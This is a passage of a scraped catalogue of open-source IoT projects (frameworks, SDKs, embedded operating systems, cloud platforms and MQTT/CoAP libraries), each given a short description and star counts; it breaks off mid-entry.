\u2605 6024 \u29d7 0 - javascript robotics and iot programming framework, developed at bocoup, firmata protocol.\nkura \u2605 85 \u29d7 1 - an open-source framework for development of iot applications\nlelylan \u2605 647 \u29d7 1 - openssl source lightweight microservices architecture for the internet of things. for developers.\nlightweight mqtt machine network \u2605 21 \u29d7 1 - lwmqn is a machine network framework with mqtt. see also: ipso alliance technical archive.\nliota \u2605 162 \u29d7 2 - is an open source offering for iot solution developers and resides primarily on iot gateways.\nopendevice \u2605 23 \u29d7 8 - open iot (internet of things) platform and framework.\npando cloud \u2605 75 \u29d7 2 - is the cloud part of pando iot solution. it's made of a bunch of tools, protocols and frameworks below: pando cloud, pando embedded framework, pando protocol as so on.\npingo \u2605 211 \u29d7 0 - generic api for controlling boards with programmable io pins.\npolymcu \u2605 84 \u29d7 2 - has been designed from the beginning to be as flexible as possible: host os independent, support any toolchain, any rtos, any micro-controller vendor sdk.\nrpi-gpio.js \u2605 221 \u29d7 5 - control raspberry pi gpio pins with node.js.\nsensorbee \u2605 54 \u29d7 33 - lightweight stream processing engine for iot\nserverless \u2605 7951 \u29d7 0 - serverless is the application framework for building web, mobile and iot applications exclusively on amazon web services' lambda and api gateway.\nsimgrid \u2605 46 \u29d7 53 - is a scientific instrument to study the behavior of large-scale distributed systems such as grids, clouds, hpc or p2p systems.\nsming \u2605 1800 \u29d7 0 - sming is an asynchronous c/c++ framework with superb performance and multiple network features. sming is open source and is tailored towards embedded devices.\nthingsboard iot gateway \u2605 463 \u29d7 246 - open-source iot gateway - integrates devices connected to legacy and third-party systems with thingsboard iot platform using opc-ua and mqtt protocols.\nlibrary\nsdk\narmbian build sdk \u2605 630 - for creating customized kernel and debian based userspace for popular development boards.\naws iot arduino y\u00fan sdk \u2605 63 \u29d7 4 - sdk for connecting to aws iot from an arduino y\u00fan.\nazure iot gateway sdk \u2605 26 \u29d7 2 - contains the infrastructure and modules to create iot gateway solutions.\ncylon.js for intel iot \u2605 29 \u29d7 40 - is a javascript framework for robotics, physical computing, and the internet of things (iot).\nelectron \u2605 41 \u29d7 16 - the electron is a tiny cellular development kit based around u-blox's sara u-series (3g) or g-series (2g) cellular modem module and a stm32f205 arm cortex m3 microcontroller.\nesp8266 arduino core \u2605 2588 \u29d7 0 - arduino core for esp8266 wifi chip.\nez-connect lite sdk \u2605 67 \u29d7 16 - marvell's starter sdk for aws iot service.\nmicrosoft azure iot sdk \u2605 203 \u29d7 1 - sdks for a variety of languages and platforms that help connect devices to microsoft azure iot services.\narduino\narduinojson \u2605 873 \u29d7 0 - an elegant and efficient json library for embedded systems.\nino \u2605 874 \u29d7 1 - ino is a command line toolkit for working with arduino hardware.\npjon \u2605 427 \u29d7 4 - digital communication framework for arduino and iot.\nwindows remote arduino \u2605 98 \u29d7 13 - remote \"arduino wiring\" interface for windows 8.1, windows phone 8.1 and windows 10. used to control an arduino from a universal windows platform application.\nwiringpi \u2605 455 \u29d7 11 - gordon's arduino wiring-like wiringpi library for the raspberry pi.\nlow level\namazon echo bridge \u2605 452 \u29d7 1 - amazon echo bridge allows you to quickly emulate a phillips hue bridge, bringing the ability to seamlessly integrate an amazon echo into various home automation systems.\nawot \u2605 69 \u29d7 8 - web server library for arduino, teensy, esp8266 and esp32\nbtstack \u2605 151 \u29d7 1 - dual-mode bluetooth stack, with small memory footprint.\ncocoamqtt \u2605 210 \u29d7 0 - mqtt for ios and os x written with swift.\ndevices \u2605 134 \u29d7 0 - suite of libraries for iot devices (written in go).\nfauxmoesp - belkin wemo emulator library for esp8266.\ninih \u2605 312 \u29d7 3 - is a simple .ini file parser written in c.\niot helpers \u2605 37 \u29d7 8 - a library that allows to easily interact with windows 10 iot core features like gpio, i2c and spi devices.\niotit flashing -----> tool !!!  \u2605 18 \u29d7 2 - is an open source command-line utility for flashing (initializing) iot devices.\nkrypton \u2605 7 \u29d7 35 - embedded tls/dtls library, source and binary compatible openssl subset\nladon \u2605 114 \u29d7 2 - is a library written in go for access control policies, similar to role based access control or access control lists.\nlibtuv \u2605 19 \u29d7 17 - asynchronous i/o for iot.js and embedded system.\nlibui \u2605 8021 \u29d7 1 - simple and portable (but not inflexible) gui library in c that uses the native gui technologies of each platform it supports.\nlk \u2605 312 \u29d7 0 - the lk embedded kernel. an smp-aware kernel designed for small systems.\nmagenta \u2605 286 \u29d7 0 - magenta is a new kernel that powers the fuchsia os.\nmatrix os \u2605 29 \u29d7 12 - is a platform for running applications on the matrix creator.\nmatrixssl \u2605 36 \u29d7 0 - is an embedded ssl and tls implementation designed for small footprint iot devices requiring low overhead per connection.\nmcuboot \u2605 43 \u29d7 3 - is a secure bootloader for 32-bit mcus.\nnexmon \u2605 885 \u29d7 2 - is our c-based firmware patching framework for broadcom/cypress wifi chips.\npelion device management client \u2605 19 \u29d7 41 - a library that connects devices to pelion device management service and to mbed-enabled cloud services from our partners.\npingo-py \u2605 223 \u29d7 15 - provides a uniform api to program devices like the raspberry pi, beaglebone black, pcduino etc. just like the python dbapi provides an uniform api for database programming in python.\npolymcu \u2605 57 \u29d7 3 - an open framework for micro-controller software.\nsecure device grid \u2605 4 \u29d7 20 - secure device-to-device communication solution for iot.\nsimbody \u2605 540 \u29d7 0 - high-performance c++ multibody dynamics/physics library for simulating articulated biomechanical and mechanical systems like vehicles, robots, and the human skeleton.\nsmartobject \u2605 8 \u29d7 2 - a smart object class that helps you with creating ipso smart objects in your js apps. see also: ipso alliance technical archive.\nsoletta \u2605 96 \u29d7 2 - soletta project is a framework for making iot devices. with soletta project's libraries developers can easily write software for devices that control actuators/sensors and communicate using standard technologies.\nspiffs \u2605 174 \u29d7 0 - wear-leveled spi flash file system for embedded devices.\nsusi \u2605 13 \u29d7 150 - is an application framework to build interfaces for arbitrary systems.\nswiftygpio \u2605 407 \u29d7 1 - a swift library to interact with linux gpio/spi on arm.\nuip \u2605 246 \u29d7 3 - uip is a very small implementation of the tcp/ip stack.\nwifidog \u2605 291 \u29d7 1 - a complete and embeddable captive portal solution for wireless community groups or individuals.\nwindows 10 iot core iot helpers \u2605 25 \u29d7 0 - his library allows to easily interact with gpio, i2c and spi devices in windows 10 iot core.\nxfrp \u2605 14 \u29d7 2 - frp client for openwrt&lede, frp is a fast reverse proxy to help you expose a local server behind a nat or firewall to the internet.\nxipki \u2605 34 \u29d7 10 - extensible simple public key infrastructure consists of ca and ocsp responder.\nxkcptun \u2605 104 \u29d7 25 - xkcptun is kcp tunnel for openwrt&lede, implemented in c language\napp\ncordova ble \u2605 149 \u29d7 3 - bluetooth low energy plugin for cordova\ncordova mqtt plugin \u2605 24 \u29d7 11 - mqtt cordova plugin for apache cordova\niot espressif android \u2605 46 \u29d7 1 - is used to control esp8266 device by android pad or phone.\nmqttx \u2605 12 \u29d7 0 - mqttx is a cross-platform mqtt desktop client open sourced by emq, which supports macos, linux, and windows. it allows users to quickly and easily test mqtt / mqtts connections, publish and subscribe to mqtt messages.\nphonegap nfc \u2605 312 \u29d7 2 - phonegap nfc plugin\npwaify \u2605 269 \u29d7 8 - experimental project to convert your pwa (progressive web app) into a cross-platform electron app. brings pwas to your desktop.\nsummon \u2605 7 \u29d7 52 - a platform for mobile devices that provides a convenient and scalable mechanism for iot device interactivity, enabled by web-based interfaces and driven by the devices themselves.\nstorage\nhypergolix \u2605 72 \u29d7 11 - is programmable cloud sync -- like dropbox, but you integrate it into your applications instead of using it from the filesystem.\niotdl \u2605 9 \u29d7 8 - an sql-like language for the iot.\nnode-iotdb \u2605 19 \u29d7 61 - easily control the internet of things using semantics.\nhstreamdb \u2605 172 - the streaming database built for iot data storage and real-time processing.\nsecurity\niotseeker this scanner will scan a network for specific types of iot devices to detect if they are using the default, factory set credentials.\nnshield \u2605 66 \u29d7 35 - an easy and simple anti-ddos solution for vps,dedicated servers and iot devices based on iptables.\nscanners-box \u2605 424 \u29d7 0 - the toolbox of open source scanners.\ntrezor-crypto \u2605 94 \u29d7 1 - \ud83d\udcd9 heavily optimized cryptography algorithms for embedded devices.\nos\nmynewt is an open-source operating system for tiny embedded devices. its goal is to make it easy to develop applications for microcontroller environments where power and cost are driving factors.\namazon freertos \u2605 842 \u29d7 0 - is an operating system for microcontrollers that makes small, low-power edge devices easy to program, deploy, secure, connect, and manage.\narm mbed \u2605 629 \u29d7 0 - the arm\u00ae mbed\u2122 iot device platform provides the operating system, cloud services, tools and developer ecosystem to make the creation and deployment of commercial, standards-based iot solutions possible at scale.\narmbian - debian based docker enabled lightweight linux for popular development boards. optimised for embedded usage.\nbrillo - brillo extends the android platform to all your connected devices.\ncontiki \u2605 1813 \u29d7 0 - the open source os for the internet of things\nf9-kernel \u2605 316 \u29d7 4 - an efficient and secure microkernel built for arm cortex-m cores, inspired by l4\nflingos \u2605 176 \u29d7 0 - an educational operating system written in c#. a great stepping stone from high to low level development.\nhuawei liteos \u2605 341 \u29d7 3 - huawei liteos kernel.\nhypriot \u2605 253 \u29d7 62 - hypriotos for the raspberry pi is a debian-based container os optimized for docker.\njanos \u2605 138 \u29d7 0 - janos is an operating system designed to run on the chipset of mobile phones.\nlinino \u2605 83 \u29d7 13 - linino is a gnu/linux distribution based on openwrt and maintained by doghunter.\nlua-rtos-esp32 \u2605 131 \u29d7 2 - is a real-time operating system designed to run on embedded systems, with minimal requirements of flash and ram memory.\nmacchina.io \u2605 144 \u29d7 0 - an open-source toolkit for building embedded iot applications that connect sensors, devices and cloud services.\nnodeos \u2605 3605 \u29d7 0 - lightweight operating system using node.js as userspace.\nnuttx - is a real-time operating system (rtos) with an emphasis on standards compliance and small footprint. scalable from 8-bit to 32-bit microcontroller environments, the primary governing standards in nuttx are posix and ansi standards.\nopenwrt \u2605 230 \u29d7 173 - openwrt is described as a linux distribution for embedded devices.\npikort \u2605 164 \u29d7 5 - a tiny linux-like real-time kernel optimized for arm cortex-m chips.\nraspbian - raspbian is a free operating system based on debian optimized for the raspberry pi hardware.\nriot \u2605 748 \u29d7 1 - the friendly operating system for the internet of things\nrmp \u2605 19 \u29d7 8 - a single-file rapid development rtos for iot with integrated graphics.\nrt-thread \u2605 493 \u29d7 0 - rt-thread is an open source real-time operating system for embedded devices from china.\nsel4 microkernel \u2605 1344 \u29d7 1 - the world's first operating-system kernel with an end-to-end proof of implementation correctness and security enforcement is available as open source.\nsilk \u2605 74 \u29d7 2 - is a free (as in free beer) firmware for a number of smartphones based on the open-source android operating system with a nodejs layer on top of it that makes it possible to write programs and get access to hardware aspects using only simple javascript.\nsnappy ubuntu core - canonical, a new, transactionally updated ubuntu for clouds and devices.\ntachyos \u2605 7 \u29d7 82 - is the rtos based on microkernel architecture which includes only minimal components like thread / synchronization, memory management, inter-thread communication while supporting execution context / address space isolation(protection) and extensible modular interface.\ntinyara \u2605 35 \u29d7 1 - is a lightweight rtos-based platform to support low-end iot devices.\ntinyos \u2605 543 \u29d7 0 - designed for low-power wireless devices, such as those used in sensor networks, ubiquitous computing, personal area networks, smart buildings, and smart meters.\ntock os \u2605 243 \u29d7 1 - is an operating system designed for running multiple concurrent, mutually distrustful applications on cortex-m based embedded platforms.\ntrochili \u2605 75 \u29d7 6 - a small rtos optimized for the embedded/iot devices. support cortex m3.\nzephyr \u2605 352 \u29d7 5 - is a small, scalable real-time operating system for use on resource-constrained systems supporting multiple architectures.\nandroid things\nandroid things user-space drivers \u2605 140 \u29d7 2 - sample peripheral drivers for android things.\nvoice controller\nalexa-rubykit \u2605 109 \u29d7 6 - implements a quick back-end service for deploying applications for amazon's echo (alexa).\nalexapi \u2605 17 \u29d7 1 - turn a raspberry pi into an alexa client.\nflask-ask \u2605 946 \u29d7 0 - is a flask extension that makes building alexa skills for the amazon echo easier and much more fun.\nplatform\n[thing-it-node] \u2605 20 \u29d7 3 - a device-independent iot platform including support of complex event processing, storyboards, and a mobile app.\nactorcloud \u2605 32 \u29d7 0 - actorcloud is an iot platform that provides one-stop platform services for enterprises with low-power iot networks. it provides multiple protocol access, message flow management, data parsing and data processing capabilities for devices on a secure and reliable basis.\nastarte \u2605 19 \u29d7 0 - astarte is an open source iot platform written in elixir. it is a turnkey solution which packs in everything you need for connecting a device fleet to a set of remote applications. it performs data modeling, automated data reduction, real-time events, and provides you with any feature you might expect in a modern iot platform. right now, linux and esp32 devices are supported out of the box using the provided sdks.\nblynk \u2605 716 \u29d7 0 - is a platform with ios and android apps to control arduino, esp8266, raspberry pi and the likes over the internet.\nclavin \u2605 212 \u29d7 2 - calvin is an application environment that lets things talk to things. it comprises of both a development framework for application developers, and a runtime environment that handles the running application.\ndevicehive - iot data platform. wide range of connectivity options, device management, security and data processing.\nembarc open software platform (osp) \u2605 23 \u29d7 9 - is a software distribution aimed at facilitating the development of embedded systems based on arcv2 processors.\nflowchain-app \u2605 22 \u29d7 50 - a flowchain plugin that provides the flow-based programming (fbp) engine.\ngrovepi \u2605 330 \u29d7 0 - is an open source platform for connecting grove sensors to the raspberry pi.\nhivemq \u2605 329 \u29d7 0 - is an open source mqtt platform and mqtt broker.\nhologram - open source, full stack platform with standalone devices and usb plug in. offers a free developer tier.\niot.js \u2605 921 \u29d7 0 - platform for internet of things with javascript.\niotgo \u2605 173 \u29d7 0 - is an open source iot platform, like wordpress, zencart and all other open source software, you can deploy your own iotgo cloud service.\njasper - jasper is an open source platform for developing always-on, voice-controlled applications.\nkerberos.io web \u2605 176 \u29d7 16 - a gui to configure the machinery and to view events that were detected by the machinery.\nkitnic \u2605 124 \u29d7 0 - a registry for ready to build open hardware electronics projects.\nlan \u2605 105 \u29d7 0 - internet of things server layer with coap, websocket, mqtt, http f\nmainflux \u2605 33 \u29d7 3 - mainflux is an open source and patent-free iot cloud platform based on microservices.\nmobius \u2605 46 \u29d7 2 - is the open source iot server platform based on the onem2m standard.\nmongoose iot \u2605 487 \u29d7 0 - is a full-stack iot platform including firmware and cloud components available for esp8266.\nnebula - a docker orchestrator designed to manage iot devices\npagenodes \u2605 99 \u29d7 0 - completely browser based iot platform, a chrome progressive web app.\nparticle(spark) - particle (formally spark) is a complete, open source, full-stack solution for cloud-connected devices.\npharothings \u2605 37 \u29d7 29 - is a live programming platform for iot projects based on pharo.\nplatformio \u2605 980 \u29d7 0 - platformio is a cross-platform code builder and the missing library manager.\nsiemens mindsphere - open, cloud-based iot operating system (uses opc ua as communication standard) from siemens which is extensible with services.\nthingengine \u2605 3 \u29d7 0 - an open source platform for iot rules that you can execute anywhere you want.\nthingsboard \u2605 5102 \u29d7 1700 - open-source iot platform - device management, data collection, processing and visualization.\nunited manufacturing hub \u2605 9 \u29d7 0 - the open-source manufacturing app platform (combines various open source solutions and packages them in a helm chart, for example nodered, vernemq and timescaledb)\niot clouds\nagile iot platform - ayla networks iot platform (with cloud services).\nalibabacloud - \"a cloud computing solution\"\narm pelion - \"arm pelion iot platform including connectivity, device and data management service\"\nartik cloud - samsung cloud for the iot.\naws iot - amazon cloud for the iot.\nazure iot hub - microsoft cloud for the iot.\nbosch iot cloud - highly scalable cloud infrastructure based on cloud foundry.\ncloudplugs iot - \"an end-to-end fog computing platform for iot.\"\nexosite murano - iot platform by exosite.\ngoogle cloud iot - google cloud platform iot solutions.\nibm watson - ibm cloud for the iot.\noracle iot cloud - oracle cloud for the internet of things.\nrightech iot cloud - iot platform.\nsalesforce iot cloud - salesforce cloud for the internet of things.\nsap hana - sap cloud for the internet of things.\nsiemens mindsphere - open iot ecosystem as paas.\nxively iot cloud - iot platform.\nyaler - \"relay infrastructure for secure access to embedded systems\".\nzatar - \"zatar is the first armmbed standards-based iot cloud service\".\nemq x cloud - fully managed mqtt iot cloud. iot mqtt 5.0 cloud service for rapid deployment, easy management, and on-demand expansion.\niiot clouds\ndataxchange - cloud manufacturing.\ndevicewise for factory - telit iiot cloud.\npredix - industrial iot cloud (by general electric).\nspace-time insight iiot - industrial iot cloud (formerly go-factory.com).\nthingworx - industrial iot cloud.\nvoice of the machine - industrial iot cloud (by parker hannifin, based on exosite).\napis\nogc sensorthings api \u2605 21 \u29d7 15 - the ogc sensorthings api is an ogc standard specification for providing an open and unified way to interconnect iot devices, data, and applications over the web\nqeo tinq \u2605 6 \u29d7 392 - tinq is completely based on the qeo publish/subscribe framework produced by technicolor as explained in the license section.\nmiddleware\nkaa \u2605 234 \u29d7 0 - kaa open-source middleware platform for building, managing, and integrating connected products with the internet of everything.\nkuzzle \u2605 502 \u29d7 0 - an open-source backend with advanced features like real-time pub/sub or geofencing and a multiprotocol interface that supports mqtt, lorawan and more. (website)\nmeact \u2605 6 \u29d7 43 - task is to get metric from external stuff, write it to and perform various action.\nopeniot \u2605 205 \u29d7 0 - the openiot middleware infrastructure will support flexible configuration and deployment of algorithms for collection\nsitewhere \u2605 61 \u29d7 0 - sitewhere open-source iot platform for device connectivity & management, data persistence, processing, integration, and analytics -- both in cloud and on-premise.\nt6 \u2605 21 \u29d7 4 - data-first iot platform to connect physical objects with time-series db and perform data analysis.\nthingspeak \u2605 743 \u29d7 0 - thingspeak is an open source \"internet of things\" application and api to store and retrieve data from things using http over the internet or via a local area network.\ntoolkits include non-os\nlayered architecture of jtag interface and tap support\niot toolkit \u2605 39 \u29d7 41 - reference implementation of the smart object api\niot-adk-addonkit \u2605 8 \u29d7 1 - contains command line scripts for package creation and image creation process and samples for iot products based on rpi2/mbm.\nkinomajs \u2605 293 \u29d7 0 - a javascript runtime optimized for the applications that power iot devices.\nmacchina.io \u2605 144 \u29d7 0 - an open-source toolkit for building embedded iot applications that connect sensors, devices and cloud services.\nopenocd \u2605 10 \u29d7 34 - openocd provides on-chip programming and debugging support with a layered architecture of jtag interface and tap support\npyocd \u2605 112 \u29d7 0 - open source python library for programming and debugging arm cortex-m microcontrollers using cmsis-dap.\nrenode \u2605 81 \u29d7 0 - a virtual development tool for multinode embedded networks.\ndata visualization\narbela \u2605 12 \u29d7 2 - rich, extensible, customizable, and configurable dashboard.\ncrouton \u2605 75 \u29d7 0 - is a dashboard that lets you visualize and control your iot devices with minimal setup.\nd3.js \u2605 49188 \u29d7 0 - a javascript visualization library for html and svg\ndashing \u2605 10067 \u29d7 0 - dashing is a sinatra based framework that lets you build beautiful dashboards.\ndevicepilot - operational analytics for connected devices (includes free-forever tier).\necharts \u2605 11457 \u29d7 0 - echarts is a commercial charting solution originally intended to address the report need of the company's various business systems.\nfreeboard \u2605 3034 \u29d7 0 - a damn-sexy, open source real-time dashboard builder for iot and other web mashups. a free open-source alternative to geckoboard.\nhighcharts \u2605 4949 \u29d7 0 - highcharts js, the javascript charting framework\niotdashboard \u2605 7 \u29d7 14 - fast django server for iot devices.\nshelloid \u2605 20 \u29d7 1 - is an open source iot-ready real-time big data web application platform built using node.js and clojure.\nhardware\napixel \u2605 8 \u29d7 31 - apixel is a combination of a esp8266 dev board with a ws2812b (addressable rgb) led all in one.\narduino - open-source electronics platform based on easy-to-use hardware and software.\narduino zero - this board aims to provide a platform for innovative projects in smart iot devices, wearable technology, high-tech automation, crazy robotics, and much more.\nbeaglebone - beaglebone black is a low-cost, community-supported development platform for developers and hobbyists.\nbitsy bits \u2605 3 \u29d7 36 - is an iot composite project. this means it has all parts to implement the full user experience.\ncarloop \u2605 6 \u29d7 0 - make apps for your car using signals from obd-ii, can and gps. publish data online using the particle platform.\ncheapduino - cheapduino is the most cheapest arduino compatible processor in the world.\nesp8266 smartwatch \u2605 39 \u29d7 0 - esp8266 diy wifi smartwatch with mpu-9250, rtc, oled, ft232, ...\nintel galileo - galileo is a microcontroller board based on the intel\u00ae quark soc x1000 application processor, a 32-bit intel pentium-class system on a chip\nmicroduino - microduino is about the size of a quarter and less than half the size of the original arduino board.\nnodemcu - a firmware based on esp8266 wifi-soc.\npowerduino \u2605 53 \u29d7 102 - a fully programmable power strip with energy monitoring and wireless connectivity.\npulpino \u2605 201 \u29d7 0 - pulpino is an open-source microcontroller system, based on a small 32-bit risc-v core developed at eth zurich.\nraspberry pi - a tiny and affordable computer that you can use to learn programming through fun, practical projects\nsquarewear - an open-source arduino-based wearable microcontroller\ntessel - tessel is a completely open source and community-driven iot and robotics development. platform.\nwemos - very-cheap firmware based on esp8266 wifi-soc.\nwidora \u2605 15 \u29d7 21 - widora is open source wifi development hardware prototype with sound card based on mt7688a running openwrt.\nhome automation\nck.homeautomation \u2605 15 \u29d7 9 - the first open source home automation sdk for windows 10 iot core.\neclipse smarthome - smart home adoption will only gain momentum if the different devices can be connected into over-arching use cases, but currently the market for smart home systems and iot gadgets is heavily fragmented.\nfloorplan for home assistant \u2605 949 \u29d7 0 - the home assistant front end provides a great way of viewing and interacting with your entities.\nheimcontrol.js \u2605 1306 \u29d7 4 - home-automation with node.js and raspberry pi\nhome-assistant \u2605 3237 \u29d7 0 - open-source home automation platform running on python 3\nhome.pi \u2605 145 \u29d7 1 - home automation with angularjs and mqtt on a raspberry pi\nhomebridge \u2605 3030 \u29d7 0 - homebridge is a lightweight nodejs server you can run on your home network that emulates the ios homekit api.\nlumos \u2605 70 \u29d7 1 - aims to change that by pairing with wifi and uses machine learning to adjust the light to match your sleep schedule.\nmagic mirror \u2605 503 \u29d7 0 - a \u26a1magic mirror\u26a1 powered by a uwp hosted web app.\nmozilla smart home \u2605 4 \u29d7 8 - offers a middle ground between \"in a box\" solutions like apple homekit and diy solutions like raspberry pi\nmycontroller \u2605 110 \u29d7 0 - is automation controller for home, office or any place.\nninja blocks - smart home controller. a computer for the coffee table.\nopenhab \u2605 2536 \u29d7 0 - a vendor and technology agnostic open source automation software for your home.\npimatic \u2605 362 \u29d7 0 - a home automation server and framework for the raspberry pi running on node.js.\nprivateeyepi - home automation and monitoring projects for raspberry pi\nrazberry - razberry brings z-wave to the raspberry pi platform.\nsmart mirror \u2605 1181 \u29d7 0 - the fairest of them all. a diy voice controlled smart mirror with iot integration.\nsonoff-homeassistant \u2605 336 \u29d7 1 - is alternative firmware for the brilliant & cheap ($ not quality) range of sonoff range of esp-8266 based wifi controlled switches.\nv\u00f6r \u2605 31 \u29d7 2 - is open source software and hardware for turning your open office into an open, real-time map for finding people, open work places and current events.\nnode-red - node-red is a programming tool for wiring together hardware devices, apis and online services in new and interesting ways.\nide\nangular 2 iot \u2605 10 \u29d7 4 - is an experimental technology that allows you to program physical hardware (buttons, leds, etc.) using angular 2.\ndeviot \u2605 70 \u29d7 1 - sublime text plugin for iot development.\nplatformio atom ide \u2605 108 \u29d7 2 - the next generation integrated development environment for iot.\nstino \u2605 1280 \u29d7 1 - is a sublime text plugin that provides an arduino-like environment for editing, compiling and uploading sketches.\nwyliodrinstudio \u2605 25 \u29d7 2 - wyliodrin studio is a chrome based ide for software and hardware development for iot and embedded linux systems.\nrobotics\nairsim \u2605 2606 \u29d7 1 - is a simulator for drones (and soon other vehicles) built on unreal engine.\nartoo \u2605 1269 \u29d7 0 - ruby framework for robotics and the internet of things.\nhubot \u2605 10481 \u29d7 0 - a customizable life embetterment robot.\nothers\nfor embedded systems (iot in mind).\naws iot button logger to git \u2605 4 \u29d7 2 - a beginner-friendly aws lambda function that logs events from iot devices into a git repository of your choice. written in typescript, tested with jest, compiled with parcel. uses azure pipelines for ci/cd.\ncorto \u2605 15 \u29d7 4 - corto is a tested, proven architecture for normalizing data from different technologies into one view regardless of location, format or datamodel.\nemul8 \u2605 50 \u29d7 71 - is an emulator of various embedded systems. with emul8 you can develop embedded software entirely in a virtual environment that runs within your pc.\nesp8266 deauther \u2605 3806 \u29d7 0 - allows you to perform a deauth attack with an esp8266 against selected networks.\nfluent-bit \u2605 90 \u29d7 4 - is a data collector for linux, embedded linux, osx and bsd family operating systems.\nkamanja \u2605 21 \u29d7 1 - is an open-source continuous decisioning engine that is hardened for enterprise reliability requirements, scalable to iot level data volumes, and enables low latency use cases.\nnode-red \u2605 2513 \u29d7 0 - a visual tool for wiring the internet of things.\nparlay \u2605 8 \u29d7 160 - is software that brings visibility and accessibility to embedded devices.\nredzilla \u2605 13 \u29d7 37 - is a service which allow to create easily instances of node-red.\nremotedebug \u2605 17 \u29d7 11 - a library to remote debug over telnet connection!\nrio \u2605 68 \u29d7 0 - an open source library allowing you to create an internet connected led wall\nsonoff-tasmota \u2605 4869 \u29d7 0 - provide esp8266 based itead sonoff with web, mqtt and ota firmware using arduino ide.\ntinyvp \u2605 12 \u29d7 48 - is a very small and lean hypervisor using mips r5 hardware vz option\nvorto \u2605 32 \u29d7 3 - is a toolset that lets you describe devices using a simple language and share these descriptions, so-called information models, in a centralized vorto repository.\nlanguage\natomvm \u2605 390 \u29d7 0 - atomvm is a tiny portable virtual machine that allows erlang and elixir code to run on microcontrollers with less than 500kb of ram such as the esp32.\neliot \u2605 76 \u29d7 48 - extensible language for everyday (and the internet of things)\nelua \u2605 393 \u29d7 1 - quickly prototype and develop embedded software applications with the power of lua and run them on a wide range of microcontroller architectures.\nesp basic \u2605 144 \u29d7 0 - basic interpreter for the esp8266\njerryscript \u2605 1244 \u29d7 0 - a javascript engine for internet of things.\nluvit \u2605 2237 \u29d7 0 - node.js for the lua inventor.\nmicropython \u2605 3070 \u29d7 0 - micropython is a lean and fast implementation of the python 3 programming language that is optimised to run on a microcontroller.\nszl \u2605 100 \u29d7 0 - is a tiny, embeddable scripting engine inspired by tcl and shell.\nterra \u2605 1248 \u29d7 0 - is a low-level system programming language that is embedded in and meta-programmed by the lua programming language.\nv7 \u2605 576 \u29d7 0 - v7 is a javascript engine written in c. it makes it possible to program internet of things (iot) devices in javascript.\npikascript \u2605 88 \u29d7 0 - pikascript is a extremely lightweight python engine that can run with less than 4kb of ram such as stm32g030c8 and stm32f103c8. it is zero dependency, zero configuration, easy to deploy and expand.\nothers\nesp8266-wifi-relay \u2605 31 \u29d7 19 - esp8266-esp12e wifi doppel relay iot unterputz montage m\u00f6glich / schaltaktor.\nk3po \u2605 22 \u29d7 9 - is a network driver and language agnostic testing tool.\nlittled \u2605 545 \u29d7 3 - a relational database for embedded devices and sensors nodes.\nmbed tls \u2605 601 \u29d7 0 - an open source, portable, easy to use, readable and flexible ssl library\nmongoose flashing tool \u2605 36 \u29d7 7 - mongoose flashing tool (also called mft) is the mongoose iot platform flashing tool.\nunik \u2605 593 \u29d7 0 - is a tool for compiling application sources into unikernels (lightweight bootable disk images) rather than binaries.\nprotocol library\nmqtt\naphid \u2605 58 \u29d7 4 - a lightweight mqtt 3.1.1 client written in pure swift 3.\narduino-mqtt \u2605 95 \u29d7 6 - mqtt library for arduino based on the eclipse paho projects.\neclipse paho javascript client \u2605 510 \u29d7 1 - the paho javascript client is an mqtt browser-based client library written in javascript that uses websockets to connect to an mqtt broker.\neclipse paho mqtt c client \u2605 142 \u29d7 3 - this code builds libraries which enable applications to connect to an mqtt broker to publish messages, and to subscribe to topics and receive published messages.\nemq x \u2605 5270 \u29d7 996 - scalable and reliable real-time mqtt messaging engine for iot in 5g era.\nesp8266 mqtt \u2605 440 \u29d7 0 - mqtt client library for esp8266 soc\nespruna - firmware for esp8266 based smart switches. includes web gui, mqtt and aot software updates.\ngleam \u2605 50 \u29d7 108 - a operation cluster based on mqtt.\nhivemq - a mqtt broker and mqtt client in java.\nhomie for esp8266 \u2605 115 \u29d7 1 - an arduino for esp8266 implementation of homie, an mqtt convention for the iot.\nhomie server \u2605 45 \u29d7 3 - a web server for homie, an mqtt convention for the iot.\njava mqtt-client \u2605 405 \u29d7 2 - a java mqtt client.\nlightmqtt \u2605 32 \u29d7 11 - is a lightweight mqtt client, written in swift.\nm2mqtt \u2605 69 \u29d7 11 - mqtt client library for .net and winrt.\nmicrott \u2605 673 \u29d7 1 - is a lightweight and efficient mqtt broker designed to raise the bar for pub/sub performance.\nmoquette \u2605 309 \u29d7 2 - java mqtt lightweight broker.\nmosca \u2605 1097 \u29d7 0 - mosca is a node.js mqtt broker.\nmosquitto \u2605 158 \u29d7 0 - an open source mqtt v3.1/v3.1.1 broker.\nmqtt explorer - tool to visualize your mqtt topics in a topic hierarchy, a mqtt swiss-army knife.\nmqtt kafka bridge \u2605 28 \u29d7 35 - bridge which consumes mqtt messages and republishes them on kafka on the same topic.\nmqtt-c \u2605 52 \u29d7 2 - a portable mqtt c client for embedded systems and pcs alike.\nmqtt.js \u2605 1359 \u29d7 0 - the mqtt client for node.js and the browser.\nneurite \u2605 4 \u29d7 5 - a serial to mqtt bridge, an easier way to build iot product with esp8266 arduino.\npaho.mqtt.wxapp \u2605 196 \u29d7 0 - paho.mqtt.javascript\u53ef\u4ee5\u8ba9\u4f60\u5728\u5fae\u4fe1\u5c0f\u7a0b\u5e8f\u91cc\u8fde\u63a5mqtt broker\uff0c\u5b9e\u73b0\u5728\u5c0f\u7a0b\u5e8f\u91cc\u63a7\u5236\u786c\u4ef6\uff0c\u4e5f\u53ef\u7528\u4e8e\u6e38\u620f\u3002\npubsub client \u2605 684 \u29d7 0 - a client library for the arduino ethernet shield that provides support for mqtt.\nstrong-pubsub \u2605 97 \u29d7 1 - pubsub for node.js, browser, mobile and iot\nsurgemq \u2605 776 \u29d7 1 - is a high performance mqtt broker and client library that aims to be fully compliant with mqtt 3.1 and 3.1.1 specs.\nvernemq \u2605 561 \u29d7 1 - a distributed mqtt message broker.\nwolfssl mqtt \u2605 155 \u29d7 14 - a c mqtt library that works with wolfssl.\nwaterstream - mqtt broker leveraging apache kafka as its own storage and distribution engine.\nnanomq - a light-weight and blazing-fast mqtt broker for iot edge platform.\ncoap\ncalifornium \u2605 36 \u29d7 0 - californium is a java implementation of coap for the iot backend and less constrained iot devices.\ncoap.net \u2605 47 \u29d7 4 - a c# implementation of the coap protocol.\ncopper \u2605 46 \u29d7 14 - a firefox add-on to browse the internet of things.\ngo coap \u2605 110 \u29d7 8 - implementation of coap in go.\nh5.coap \u2605 36 \u29d7 26 - implementation of the constrained application protocol (coap) client for node.js.\nicoap \u2605 28 \u29d7 21 - objective-c client implementation of 